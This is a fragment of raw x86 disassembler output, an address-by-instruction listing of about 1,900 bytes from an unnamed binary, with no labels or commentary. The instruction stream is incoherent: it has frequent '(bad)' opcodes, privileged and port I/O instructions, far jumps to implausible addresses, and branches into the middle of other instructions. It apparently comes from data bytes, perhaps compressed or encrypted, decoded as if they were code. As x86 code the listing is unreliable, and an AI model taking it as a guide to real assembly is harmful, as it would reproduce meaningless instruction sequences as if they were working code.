  41582c:	cmp    ebp,DWORD PTR [ecx-0x77612fcf]
  415832:	adc    al,0x89
  415834:	fstp   DWORD PTR [ecx-0x2b]
  415837:	mov    ebp,0x391f7f5e
  41583c:	fstp   DWORD PTR [edi]
  41583e:	or     eax,edx
  415840:	aaa    
  415841:	and    eax,0xc341efd
  415846:	and    ecx,ecx
  415848:	aam    0x96
  41584a:	ja     0x415810
  41584c:	jp     0x4158b7
  41584e:	cmc    
  41584f:	gs mov bh,0xe8
  415852:	xchg   esp,eax
  415853:	jns    0x4157ef
  415855:	or     dh,BYTE PTR [ecx+0x18]
  415858:	lock push ss
  41585a:	int3   
  41585b:	aad    0xa2
  41585d:	jecxz  0x415812
  41585f:	loope  0x4158c2
  415861:	jno    0x415830
  415863:	cli    
  415864:	mov    ebx,0xc3b1cf49
  415869:	sbb    esi,DWORD PTR [edx+ebx*1-0x19cf68b9]
  415870:	inc    ecx
  415871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415872:	(bad)  
  415873:	lea    esi,[ecx+0x6c]
  415876:	cli    
  415877:	lock bound ebx,QWORD PTR [eax-0x68cca463]
  41587e:	bound  esi,QWORD PTR [edi-0x29f8ab15]
  415884:	pop    edx
  415885:	dec    ecx
  415886:	push   ss
  415887:	or     DWORD PTR [esi-0x56],0xffffff87
  41588b:	test   ch,0xbd
  41588e:	xlat   BYTE PTR ds:[ebx]
  41588f:	loopne 0x415863
  415891:	fisttp DWORD PTR [ecx]
  415893:	mov    cl,0xda
  415895:	loope  0x4158c0
  415897:	(bad)  
  415898:	lods   eax,DWORD PTR ds:[esi]
  415899:	adc    DWORD PTR [eax+0x44],edx
  41589c:	repnz mov eax,ds:0xcc51f1a4
  4158a2:	inc    eax
  4158a3:	xchg   edi,eax
  4158a4:	push   cs
  4158a5:	pusha  
  4158a6:	cs pushf 
  4158a8:	sbb    al,0xa3
  4158aa:	jno    0x41591b
  4158ac:	out    dx,eax
  4158ad:	inc    edx
  4158ae:	daa    
  4158af:	ja     0x4158d3
  4158b1:	jnp    0x41591c
  4158b3:	or     eax,DWORD PTR [ebx+eiz*8]
  4158b6:	xchg   DWORD PTR [esi],ebx
  4158b8:	or     eax,edx
  4158ba:	in     al,0x1a
  4158bc:	pop    edx
  4158bd:	cmp    dl,bl
  4158bf:	pop    edx
  4158c0:	ins    DWORD PTR es:[edi],dx
  4158c1:	int3   
  4158c2:	or     al,0x4c
  4158c4:	xor    al,0xb2
  4158c6:	mov    dl,0x78
  4158c8:	mov    al,ds:0xcfbfcb32
  4158cd:	hlt    
  4158ce:	inc    ebp
  4158cf:	into   
  4158d0:	dec    eax
  4158d1:	dec    edx
  4158d2:	out    dx,al
  4158d3:	sbb    BYTE PTR [esi],cl
  4158d5:	and    eax,0xf8ad828e
  4158da:	in     eax,0x96
  4158dc:	adc    al,0xb1
  4158de:	lods   al,BYTE PTR ds:[esi]
  4158df:	enter  0x7698,0x20
  4158e3:	pop    ecx
  4158e4:	xlat   BYTE PTR ds:[ebx]
  4158e5:	xchg   edx,eax
  4158e6:	mov    eax,ds:0xf0a3ec79
  4158eb:	stc    
  4158ec:	retf   
  4158ed:	jno    0x4158d7
  4158ef:	xchg   edi,eax
  4158f0:	aaa    
  4158f1:	arpl   WORD PTR [edi+0x7f],bp
  4158f4:	pop    esi
  4158f5:	jns    0x415897
  4158f7:	popf   
  4158f8:	jb     0x41588b
  4158fa:	push   edi
  4158fb:	test   esp,esp
  4158fd:	sbb    al,0xa
  4158ff:	cmp    ch,BYTE PTR [ebx-0x418e036b]
  415905:	pop    edi
  415906:	scas   al,BYTE PTR es:[edi]
  415907:	xchg   ebp,eax
  415908:	sbb    esi,esi
  41590a:	and    dl,BYTE PTR [ebp+0x1b252124]
  415910:	fild   QWORD PTR [ebx-0x7b6a8a00]
  415916:	jle    0x415910
  415918:	fst    DWORD PTR [edi-0x3c]
  41591b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41591c:	lock push esp
  41591e:	imul   esi,edx,0x79
  415921:	pmaddwd mm5,QWORD PTR [eax+0x12]
  415925:	fdivp  st(5),st
  415927:	or     bl,0x24
  41592a:	or     bl,BYTE PTR [esi+0x65]
  41592d:	enter  0x97b7,0x50
  415931:	xlat   BYTE PTR ds:[ebx]
  415932:	js     0x4159a3
  415934:	fdivr  QWORD PTR [ecx+0x68b3ba3d]
  41593a:	mov    eax,ds:0xb9c26861
  41593f:	icebp  
  415940:	push   cs
  415941:	fisub  WORD PTR [ebp+0x595b567e]
  415947:	lahf   
  415948:	mov    edx,0x6b63bf4
  41594d:	jecxz  0x4158dc
  41594f:	fwait
  415950:	pop    ebx
  415951:	adc    cl,BYTE PTR [edi]
  415953:	add    esp,ebp
  415955:	(bad)  
  415956:	and    BYTE PTR [esi+edi*1-0x11],dl
  41595a:	inc    esi
  41595b:	out    0xe2,eax
  41595d:	xor    DWORD PTR [esi],eax
  41595f:	jbe    0x415943
  415961:	mov    ebp,0xa973b6a
  415966:	pusha  
  415967:	dec    ebx
  415968:	xor    bl,BYTE PTR [ebp+esi*4-0x2a112aad]
  41596f:	(bad)
  415972:	(bad)  
  415973:	dec    ebp
  415974:	addr16 jmp 0x41599c
  415977:	sbb    al,0xd7
  415979:	or     ebp,DWORD PTR [edx-0x2a]
  41597c:	xchg   ebp,eax
  41597d:	cmp    DWORD PTR ds:0xd359af84,0xd
  415984:	stos   DWORD PTR es:[edi],eax
  415985:	or     al,0x80
  415987:	mov    dh,0x63
  415989:	scas   al,BYTE PTR es:[edi]
  41598a:	not    dh
  41598c:	(bad)  
  41598e:	mov    ds:0x3c1d43e9,al
  415993:	push   cs
  415994:	aad    0x9e
  415996:	sbb    BYTE PTR [edi-0x51],dl
  415999:	push   ebp
  41599a:	push   0xa052753f
  41599f:	push   ds
  4159a0:	cmp    dl,BYTE PTR ds:0x9b01db31
  4159a6:	(bad)
  4159aa:	push   edi
  4159ab:	cli    
  4159ac:	shr    ebx,0xb7
  4159af:	dec    ebx
  4159b0:	sar    DWORD PTR [ebx+0x33],cl
  4159b3:	dec    eax
  4159b4:	mov    ch,0x5c
  4159b6:	sbb    edi,edi
  4159b8:	int    0x20
  4159ba:	push   esp
  4159bb:	xor    BYTE PTR [ebx-0x2f88c95d],0x5b
  4159c2:	xor    ecx,DWORD PTR [edi]
  4159c4:	retf   
  4159c5:	xchg   esi,eax
  4159c6:	inc    edi
  4159c7:	mov    dl,0x9f
  4159c9:	int    0x95
  4159cb:	aas    
  4159cc:	repz cwde 
  4159ce:	dec    eax
  4159cf:	addr16 adc eax,0x7b00e456
  4159d5:	sbb    BYTE PTR [edi],bh
  4159d7:	mov    esp,0x5b6f4726
  4159dc:	mov    bh,0x58
  4159de:	frstor [edx+0x3e071182]
  4159e4:	je     0x41599d
  4159e6:	mov    al,0xf0
  4159e8:	int    0x6d
  4159ea:	mov    ebp,cr1
  4159ed:	dec    esp
  4159ee:	fsub   st(5),st
  4159f0:	sbb    DWORD PTR [ecx-0x14],0xd5410c37
  4159f7:	dec    edi
  4159f8:	mov    al,ds:0x76ba9a2
  4159fd:	mov    esi,0xfcc493c0
  415a02:	aaa    
  415a03:	or     al,0xa
  415a05:	push   ss
  415a06:	sub    esi,esi
  415a08:	imul   eax,esp,0xffffffd3
  415a0b:	shl    edx,cl
  415a0d:	out    dx,al
  415a0e:	fild   WORD PTR [ebx-0x2d4df4b0]
  415a14:	xchg   ebp,eax
  415a15:	and    dh,BYTE PTR [ecx+0x3502fb6b]
  415a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a1c:	(bad)  
  415a1e:	loopne 0x415a34
  415a20:	ror    BYTE PTR [esi+ebp*2+0x37],1
  415a24:	cmc    
  415a25:	jmp    0x92db:0x7add8074
  415a2c:	scas   al,BYTE PTR es:[edi]
  415a2d:	xor    BYTE PTR [edi+0x34],ah
  415a30:	jae    0x415aa2
  415a32:	into   
  415a33:	pop    esp
  415a34:	icebp  
  415a35:	out    dx,al
  415a36:	adc    al,0x91
  415a38:	mov    al,ds:0xc9e3552e
  415a3d:	fsub   st(4),st
  415a3f:	dec    bp
  415a41:	ins    BYTE PTR es:[edi],dx
  415a42:	sti    
  415a43:	inc    edx
  415a44:	call   0x14c:0xc878a16b
  415a4b:	cwde   
  415a4c:	dec    ebp
  415a4d:	and    DWORD PTR [edi],ebx
  415a4f:	mov    bh,0xf8
  415a51:	shl    edi,0xfc
  415a54:	scas   eax,DWORD PTR es:[edi]
  415a55:	and    bl,BYTE PTR [ebp-0x1b]
  415a58:	enter  0xeb4e,0xcf
  415a5c:	fsubr  QWORD PTR ds:0xeb69876a
  415a62:	xchg   esp,eax
  415a63:	jbe    0x415acd
  415a65:	dec    ecx
  415a66:	sbb    al,0x68
  415a68:	fisttp DWORD PTR [ebx]
  415a6a:	push   ecx
  415a6b:	clc    
  415a6c:	push   ecx
  415a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a6e:	enter  0x901d,0x77
  415a72:	inc    esp
  415a73:	pop    es
  415a74:	retf   
  415a75:	rcl    DWORD PTR [ebx+0x66],cl
  415a78:	cmp    al,0x47
  415a7a:	stos   DWORD PTR es:[edi],eax
  415a7b:	pop    es
  415a7c:	loopne 0x415a08
  415a7e:	lea    eax,[eax+esi*2]
  415a81:	inc    ebx
  415a82:	daa    
  415a83:	outs   dx,DWORD PTR ds:[esi]
  415a84:	in     eax,0x2f
  415a86:	mov    bh,0xd5
  415a88:	dec    ebx
  415a89:	jb     0x415abe
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	jo     0x415a69
  415aa6:	sub    BYTE PTR [ebx],bl
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415a63
  415ab1:	test   DWORD PTR [ebx],ebp
  415ab3:	fsubr  QWORD PTR [edi+0x742a648d]
  415ab9:	sub    DWORD PTR [esi+0x38f86882],edx
  415abf:	mov    ecx,0xaa8ae4bd
  415ac4:	imul   eax,DWORD PTR [eax-0x2c],0xffffffbe
  415ac8:	lea    esi,[edx]
  415aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415acb:	jno    0x415a6e
  415acd:	sti    
  415ace:	jbe    0x415adb
  415ad0:	cmp    DWORD PTR [ebx-0x73],esp
  415ad3:	mov    edi,0x93c813b0
  415ad8:	mov    dl,0xd7
  415ada:	xor    ebx,DWORD PTR [ebp-0x33da5196]
  415ae0:	inc    ebp
  415ae1:	adc    BYTE PTR [ebx-0x689a0eb],dh
  415ae7:	xchg   ebx,eax
  415ae8:	ror    DWORD PTR [eax+0x99a0b95],0x95
  415aef:	(bad)  
  415af0:	cmp    ah,BYTE PTR [edx-0x60da5203]
  415af6:	and    ecx,ebx
  415af8:	ret    0xf28b
  415afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415afc:	sahf   
  415afd:	add    eax,0x6485ff45
  415b02:	stc    
  415b03:	mov    al,ds:0xe5bd91f7
  415b08:	ds mov esp,0x8b05240
  415b0e:	lea    edx,[edi+0x575d8f31]
  415b14:	xchg   bl,cl
  415b16:	push   cs
  415b17:	rcr    DWORD PTR [edx+0xd1c2895],cl
  415b1d:	daa    
  415b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b1f:	mov    edi,0x933d2a4a
  415b24:	stos   DWORD PTR es:[edi],eax
  415b25:	dec    esi
  415b26:	or     al,0x61
  415b28:	jno    0x415ae5
  415b2a:	leave  
  415b2b:	pop    ecx
  415b2c:	sti    
  415b2d:	rcr    edi,cl
  415b2f:	out    dx,eax
  415b30:	lods   al,BYTE PTR ds:[esi]
  415b31:	mov    DWORD PTR [esi],esi
  415b33:	push   edx
  415b34:	call   0x5eb61f56
  415b39:	add    esi,DWORD PTR [ebp+0x2a27ad90]
  415b3f:	mov    ch,0xcd
  415b41:	xchg   ecx,eax
  415b42:	or     esi,DWORD PTR [eax+0x428af25f]
  415b48:	mov    bh,0xe9
  415b4a:	mov    ebp,0x82926d3a
  415b4f:	or     ah,BYTE PTR [edx]
  415b51:	dec    esi
  415b52:	shl    bh,0xd7
  415b55:	inc    esp
  415b56:	stos   DWORD PTR es:[edi],eax
  415b57:	adc    BYTE PTR [ebx+0x8],cl
  415b5a:	mov    esp,0xd58f73a
  415b5f:	fs nop
  415b61:	aam    0x29
  415b63:	mov    esp,0x388a13bb
  415b68:	adc    DWORD PTR [ebp+esi*1-0x40],esp
  415b6c:	out    dx,al
  415b6d:	sbb    esi,DWORD PTR [edx-0x6f67555b]
  415b73:	and    al,0xbd
  415b75:	lock repz mov WORD PTR [edi+0x36],ss
  415b7a:	paddusb mm6,mm1
  415b7d:	loop   0x415b33
  415b7f:	jns    0x415b24
  415b81:	xchg   edi,eax
  415b82:	sahf   
  415b83:	add    al,ah
  415b85:	xor    eax,0xc8e71c32
  415b8a:	mov    ebx,0xf85823b5
  415b8f:	adc    DWORD PTR [esi],esp
  415b91:	push   0xafb012bb
  415b96:	or     eax,0x10b8f4e9
  415b9b:	xor    edx,DWORD PTR [edi]
  415b9d:	ins    DWORD PTR es:[edi],dx
  415b9e:	xchg   edi,eax
  415b9f:	xchg   BYTE PTR [eax+0x5a],ch
  415ba2:	in     eax,0x2c
  415ba4:	jmp    FWORD PTR [ecx-0x63]
  415ba7:	loop   0x415ba4
  415ba9:	pop    eax
  415baa:	aaa    
  415bab:	lods   eax,DWORD PTR ss:[esi]
  415bad:	leave  
  415bae:	xor    DWORD PTR [edx-0x6],ebp
  415bb1:	cdq    
  415bb2:	pop    ss
  415bb3:	mov    ah,0xf5
  415bb5:	dec    esp
  415bb6:	pop    edi
  415bb7:	sub    al,0x22
  415bb9:	test   DWORD PTR [edi+0x177e1e38],edi
  415bbf:	jge    0x415c22
  415bc1:	adc    DWORD PTR [ebx-0x2f64400c],esi
  415bc7:	push   es
  415bc8:	sub    DWORD PTR [eax+0x344cf362],0xffffffba
  415bcf:	dec    esp
  415bd0:	cmp    al,0x80
  415bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bd3:	icebp  
  415bd4:	shl    DWORD PTR [ebx-0x5c],0xf3
  415bd8:	dec    edx
  415bd9:	mov    ebx,0xba548a0c
  415bde:	in     al,dx
  415bdf:	stc    
  415be0:	xchg   edx,eax
  415be1:	loopne 0x415b92
  415be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be4:	clc    
  415be5:	dec    edx
  415be6:	cli    
  415be7:	int3   
  415be8:	les    edx,FWORD PTR [ebp+0x48]
  415beb:	adc    eax,0x3f2124e1
  415bf0:	dec    edi
  415bf1:	xor    DWORD PTR [edx],0xffffffd8
  415bf4:	shr    DWORD PTR [esi-0x1b65cc3d],cl
  415bfa:	mov    cl,0xa5
  415bfc:	and    BYTE PTR [eax+0x10],ah
  415bff:	ins    DWORD PTR es:[edi],dx
  415c00:	call   0xc38c71ce
  415c05:	push   eax
  415c06:	jne    0x415bb1
  415c08:	mov    dl,ah
  415c0a:	dec    edx
  415c0b:	call   0x66a8:0xfa4cbe3e
  415c12:	idiv   DWORD PTR [ebp-0x24]
  415c15:	mov    eax,ds:0x9774ebf9
  415c1a:	int3   
  415c1b:	test   BYTE PTR [ecx+ebx*4+0x1f743a6c],0xf1
  415c23:	jnp    0x415bf7
  415c25:	sub    eax,esp
  415c27:	pop    ebp
  415c28:	in     al,dx
  415c29:	iret   
  415c2a:	lea    esi,fs:[esi]
  415c2d:	xchg   ecx,eax
  415c2e:	std    
  415c2f:	test   al,0x6c
  415c32:	sub    esp,ecx
  415c34:	mov    ds:0xc11c6f5e,al
  415c39:	xchg   BYTE PTR [esi-0x6857f051],bh
  415c3f:	push   edx
  415c40:	aad    0xff
  415c42:	sub    BYTE PTR [ecx-0xe03c85f],cl
  415c48:	daa    
  415c49:	es jae 0x415be0
  415c4c:	cld    
  415c4d:	call   0x884a8699
  415c52:	outs   dx,BYTE PTR ds:[esi]
  415c53:	aad    0x5b
  415c55:	jmp    0x991f91e7
  415c5a:	sbb    DWORD PTR [edi],eax
  415c5c:	repz cld 
  415c5e:	mov    BYTE PTR [ecx],dh
  415c60:	sub    eax,0xa761b878
  415c65:	dec    ecx
  415c66:	(bad)  
  415c67:	dec    esp
  415c68:	and    esp,esi
  415c6a:	dec    eax
  415c6b:	jno    0x415c5a
  415c6d:	pop    esi
  415c6e:	out    0x15,eax
  415c70:	js     0x415ce1
  415c72:	sahf   
  415c73:	lods   eax,DWORD PTR ds:[esi]
  415c74:	aad    0xcb
  415c76:	xchg   ecx,eax
  415c77:	dec    esi
  415c78:	push   ebx
  415c79:	mov    eax,ds:0xf472489d
  415c7e:	fist   WORD PTR [ecx+0x7222cd95]
  415c84:	cli    
  415c85:	mov    eax,0x3f36b11d
  415c8a:	loopne 0x415c28
  415c8c:	dec    ebp
  415c8d:	mov    BYTE PTR [eax-0x1378d286],ah
  415c93:	test   DWORD PTR [esi],0xce8a8b27
  415c99:	dec    eax
  415c9a:	pop    ss
  415c9b:	(bad)  
  415c9c:	imul   esi,DWORD PTR [ebx+0x121c6ed9],0xfda14b7f
  415ca6:	push   esp
  415ca7:	push   es
  415ca8:	outs   dx,BYTE PTR ds:[esi]
  415ca9:	in     al,0xdf
  415cab:	(bad)  
  415cac:	mov    bh,0xac
  415cae:	mov    ds:0x9959aac7,eax
  415cb3:	push   edi
  415cb4:	repz stc 
  415cb6:	test   dl,bl
  415cb8:	cdq    
  415cb9:	int    0xaf
  415cbb:	out    dx,al
  415cbc:	pushf  
  415cbd:	lods   eax,DWORD PTR ds:[esi]
  415cbe:	add    BYTE PTR ss:[ebx],ch
  415cc1:	dec    ecx
  415cc2:	pushf  
  415cc3:	pop    eax
  415cc4:	mov    esi,0xfcf87c13
  415cc9:	push   si
  415ccb:	stos   BYTE PTR es:[edi],al
  415ccc:	dec    ebx
  415ccd:	lock mov edi,0xf667a4ed
  415cd3:	out    dx,al
  415cd4:	int    0x11
  415cd6:	and    esi,DWORD PTR [edx+0x3f9e3df6]
  415cdc:	pop    ss
  415cdd:	call   0x2af79708
  415ce2:	xchg   DWORD PTR [ebx],ebx
  415ce4:	out    dx,al
  415ce5:	sub    BYTE PTR [eax],0x98
  415ce8:	pushf  
  415ce9:	or     cl,ch
  415ceb:	iret   
  415cec:	mov    ch,0x7a
  415cee:	xor    BYTE PTR [ebp+esi*4-0x4f],bl
  415cf2:	int    0x67
  415cf4:	sbb    eax,0x476e9faa
  415cf9:	sbb    eax,0xde64a6e5
  415cfe:	dec    ebx
  415cff:	(bad)  
  415d00:	std    
  415d01:	dec    esi
  415d02:	int3   
  415d03:	dec    esi
  415d04:	popa   
  415d05:	push   es
  415d06:	test   al,0x2
  415d08:	test   BYTE PTR [ecx],0xec
  415d0b:	iret   
  415d0c:	push   ebp
  415d0d:	ret    0x7555
  415d10:	das    
  415d11:	pop    esp
  415d12:	sbb    DWORD PTR [esi+0x493c7e28],eax
  415d18:	dec    eax
  415d19:	sbb    eax,0x1ecbb523
  415d1e:	iret   
  415d1f:	les    ebx,FWORD PTR [esp+ebx*1-0x49]
  415d23:	imul   BYTE PTR [edi+edx*4+0x6b]
  415d27:	push   0xdde16b56
  415d2c:	loop   0x415ce6
  415d2e:	ret    0x1f6d
  415d31:	dec    eax
  415d32:	or     esi,0x8e6a0778
  415d38:	jmp    0x415ce5
  415d3a:	add    ebp,DWORD PTR [edx-0x679bc78f]
  415d40:	mov    ebp,0x6f5ce6c1
  415d45:	adc    bh,BYTE PTR [edi+ecx*8+0x5c]
  415d49:	outs   dx,DWORD PTR ds:[esi]
  415d4a:	test   eax,0x9c7d0502
  415d4f:	iret   
  415d50:	inc    esp
  415d51:	sahf   
  415d52:	arpl   bp,bp
  415d54:	mov    ecx,0x6f5296f9
  415d59:	call   0xf810b74
  415d5e:	icebp  
  415d5f:	es in  al,dx
  415d61:	enter  0xe49e,0x66
  415d65:	xchg   ebp,eax
  415d66:	mov    esp,0xb779c74c
  415d6b:	jg     0x415cee
  415d6d:	mov    esi,ds
  415d6f:	cmp    ch,BYTE PTR [eax]
  415d71:	ds call 0x558b:0xb2a9196d
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	imul   eax,DWORD PTR [edi],0xa81c164
  415d9a:	jg     0x415e0c
  415d9c:	mov    ecx,0x5c70707e
  415da1:	jb     0x415d9c
  415da3:	outs   dx,DWORD PTR ds:[esi]
  415da4:	sbb    esp,DWORD PTR [eax+0x73149772]
  415daa:	sub    edx,DWORD PTR [ecx]
  415dac:	hlt    
  415dad:	fstp   QWORD PTR [edi+ebx*1]
  415db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db1:	push   es
  415db2:	int    0xda
  415db4:	in     al,dx
  415db5:	adc    al,0x5
  415db7:	jmp    0x4202:0x329801d9
  415dbe:	sub    bh,BYTE PTR [ecx+0x4d959569]
  415dc4:	adc    edx,DWORD PTR ds:[ecx+0x61a9b148]
  415dcb:	jg     0x415d8d
  415dcd:	iret   
  415dce:	clc    
  415dcf:	adc    al,0xf7
  415dd1:	adc    BYTE PTR ds:0x25fa9e5b,dh
  415dd7:	sahf   
  415dd8:	mov    esp,0x7c56fc81
  415ddd:	xchg   ebp,eax
  415dde:	les    ebx,FWORD PTR [ecx-0x61]
  415de1:	out    dx,eax
  415de2:	push   edx
  415de3:	inc    BYTE PTR [ebx+0x1642f0ea]
  415de9:	call   0x67c:0xfd50a88d
  415df0:	inc    esi
  415df1:	(bad)  
  415df2:	mov    ebx,0xf8bcbc24
  415df7:	enter  0xcfdc,0xf2
  415dfb:	mov    WORD PTR ds:0x8cf0e367,cs
  415e01:	cmp    bl,dh
  415e03:	dec    eax
  415e04:	mul    DWORD PTR ds:0xbc109345
  415e0a:	ss jno 0x415e34
  415e0d:	(bad)  
  415e0e:	loop   0x415de1
  415e10:	xlat   BYTE PTR ds:[ebx]
  415e11:	cmp    DWORD PTR [edi],ebx
  415e13:	sub    BYTE PTR ds:0xc0bd1908,al
  415e19:	popf   
  415e1a:	iret   
  415e1b:	jnp    0x415e9c
  415e1d:	fdiv   DWORD PTR [edx-0x68003634]
  415e23:	in     al,0xc6
  415e25:	mov    ds:0xe0556601,eax
  415e2a:	retf   
  415e2b:	and    al,0xd3
  415e2d:	scas   al,BYTE PTR es:[edi]
  415e2e:	xor    dl,BYTE PTR [ebx]
  415e30:	jge    0x415dc5
  415e32:	fs jbe 0x415def
  415e35:	fist   DWORD PTR [ebx]
  415e37:	cmc    
  415e38:	sub    DWORD PTR [ebx-0x3a],ebx
  415e3b:	sub    bl,BYTE PTR [ebx+0x36]
  415e3e:	mov    BYTE PTR [edx+edx*1+0x4c],al
  415e42:	push   esp
  415e43:	and    esp,DWORD PTR [esi-0x7f]
  415e46:	mov    al,0xd4
  415e48:	cli    
  415e49:	pop    edx
  415e4a:	cdq    
  415e4b:	cmp    eax,0x74664030
  415e50:	sbb    ah,0x53
  415e53:	test   al,cl
  415e55:	sub    BYTE PTR [eax-0x4d],dh
  415e58:	lds    eax,FWORD PTR [edx-0x7d2ae917]
  415e5e:	(bad)  
  415e5f:	mov    ebx,edx
  415e61:	(bad)  
  415e62:	xchg   ebp,eax
  415e63:	stos   DWORD PTR es:[edi],eax
  415e64:	cmp    dh,BYTE PTR [esi-0x7]
  415e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e68:	in     al,0x56
  415e6a:	and    BYTE PTR [ecx-0x32accab7],ch
  415e70:	stos   DWORD PTR es:[edi],eax
  415e71:	pop    ebx
  415e72:	jmp    0x415e42
  415e74:	inc    esp
  415e75:	jecxz  0x415e8b
  415e77:	mov    cl,0xd2
  415e79:	rol    DWORD PTR [ecx],0x58
  415e7c:	stc    
  415e7d:	rcl    ch,0x46
  415e80:	mov    edx,0x84f6f5a8
  415e85:	or     DWORD PTR [ebp+0x284b80ce],0xfffffffe
  415e8c:	lods   eax,DWORD PTR ds:[esi]
  415e8d:	xchg   ecx,eax
  415e8e:	ds xchg ebp,eax
  415e90:	dec    esp
  415e91:	mov    esi,esp
  415e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e94:	add    eax,0x5fe7a405
  415e99:	push   ecx
  415e9a:	jnp    0x415ea1
  415e9c:	push   es
  415e9d:	cmp    al,0x9d
  415e9f:	pop    ds
  415ea0:	jno    0x415f00
  415ea2:	retf   0xc8dd
  415ea5:	bound  esi,QWORD PTR [ebx+0x44]
  415ea8:	scas   al,BYTE PTR es:[edi]
  415ea9:	pushf  
  415eaa:	dec    ebp
  415eab:	das    
  415eac:	mov    edi,eax
  415eae:	bound  eax,QWORD PTR [esi]
  415eb0:	inc    eax
  415eb1:	in     al,dx
  415eb2:	adc    eax,DWORD PTR [edx+eax*1+0xf]
  415eb6:	dec    eax
  415eb7:	int    0x95
  415eb9:	int    0x8f
  415ebb:	lock cwde 
  415ebd:	xchg   esp,eax
  415ebe:	out    dx,al
  415ebf:	fwait
  415ec0:	or     al,0xa5
  415ec2:	nop
  415ec3:	int    0x32
  415ec5:	dec    esp
  415ec6:	or     bh,cl
  415ec8:	mov    dh,0x26
  415eca:	icebp  
  415ecb:	mov    ah,0x95
  415ecd:	push   edx
  415ece:	jbe    0x415f19
  415ed0:	jp     0x415f08
  415ed2:	cmp    eax,0x965a257
  415ed7:	(bad)  
  415ed8:	push   ss
  415ed9:	into   
  415eda:	mov    eax,0x76f48c14
  415edf:	ds dec eax
  415ee1:	ins    DWORD PTR es:[edi],dx
  415ee2:	lods   eax,DWORD PTR ds:[esi]
  415ee3:	inc    eax
  415ee4:	scas   al,BYTE PTR es:[edi]
  415ee5:	sar    DWORD PTR [esp+edx*1-0x51a321d0],cl
  415eec:	ret    0xa284
  415eef:	test   eax,0x5773b8aa
  415ef4:	sub    al,0x28
  415ef6:	jecxz  0x415f59
  415ef8:	mov    dh,0xcd
  415efa:	(bad)  
  415efb:	lea    esi,[eax-0x18]
  415efe:	cmp    bh,BYTE PTR ss:0xd256df21
  415f05:	(bad)  
  415f06:	lock cmc 
  415f08:	add    al,0x2e
  415f0a:	sub    edx,ebx
  415f0c:	mov    al,0x88
  415f0e:	into   
  415f0f:	mov    bl,0x6a
  415f11:	and    eax,0x98dcdaad
  415f16:	out    dx,al
  415f17:	fst    DWORD PTR [eax]
  415f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f1a:	ds aam 0x46
  415f1d:	in     al,0xb8
  415f1f:	dec    esi
  415f20:	xchg   ebp,eax
  415f21:	imul   esp,ebx,0x5c
  415f24:	inc    esi
  415f25:	outs   dx,BYTE PTR ds:[esi]
  415f26:	fld    TBYTE PTR [eax]
  415f28:	(bad)  
  415f29:	cmp    BYTE PTR [edi-0x1f],ch
  415f2c:	mov    cl,BYTE PTR [esi]
  415f2e:	addr16 jmp 0xacdae292
  415f34:	call   0x6261e8a0
  415f39:	sub    DWORD PTR [eax+0x3],eax
  415f3c:	arpl   WORD PTR [eax],bp
  415f3e:	sbb    ch,bh
  415f40:	loopne 0x415fb0
  415f42:	rcl    bl,1
  415f44:	xor    edx,DWORD PTR [edi-0x78]
  415f47:	pop    edi
  415f48:	mov    ebx,0x9fda36c9
  415f4d:	aas    
  415f4e:	adc    BYTE PTR [ecx-0x654fcbd2],0x37
  415f55:	mov    esp,0xc769de6e
  415f5a:	xchg   ecx,eax
  415f5b:	test   DWORD PTR [ebp-0x737711cc],esp
  415f61:	popf   
  415f62:	retf   0x860d
  415f65:	jl     0x415f19
  415f67:	out    dx,eax
  415f68:	ins    BYTE PTR es:[edi],dx
  415f69:	loop   0x415f5b
  415f6b:	je     0x415f90
  415f6d:	push   0x14
  415f6f:	pop    ss
  415f70:	lahf   
  415f71:	nop
  415f72:	(bad)  
  415f73:	cdq    
  415f74:	push   cs
  415f75:	fsubr  st,st(5)
  415f77:	pop    edx
  415f78:	in     al,0x13
  415f7a:	pusha  
  415f7b:	or     eax,0x704a60d9
  415f80:	test   al,0x99
  415f82:	sub    BYTE PTR [ebp-0x4acd4ce1],ah
  415f88:	and    edx,ecx
  415f8a:	test   BYTE PTR [edi+0x77],0xc6
  415f8e:	jp     0x415f6d
  415f90:	jmp    0x415fa8
  415f92:	jnp    0x415f56
  415f94:	xor    BYTE PTR [eax],bl
  415f96:	dec    ecx
  415f97:	icebp  
  415f98:	dec    ecx
  415f99:	add    DWORD PTR [edi-0xe42667d],esi
  415f9f:	int3   
  415fa0:	xor    bh,bl
  415fa2:	xor    ebp,esi
  415fa4:	pop    esp
  415fa5:	sub    ebx,ecx
  415fa7:	frstor [edx+0x1bdbadaa]
  415fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fae:	inc    eax
  415faf:	in     eax,dx
  415fb0:	aad    0x4f
  415fb2:	or     DWORD PTR [ebx],ebp
  415fb4:	and    cl,dh
  415fb6:	(bad)  
  415fb7:	mov    bl,0x5d
  415fb9:	pop    ss
  415fba:	loopne 0x416012
  415fbc:	retf   
  415fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fbe:	xlat   BYTE PTR ds:[ebx]
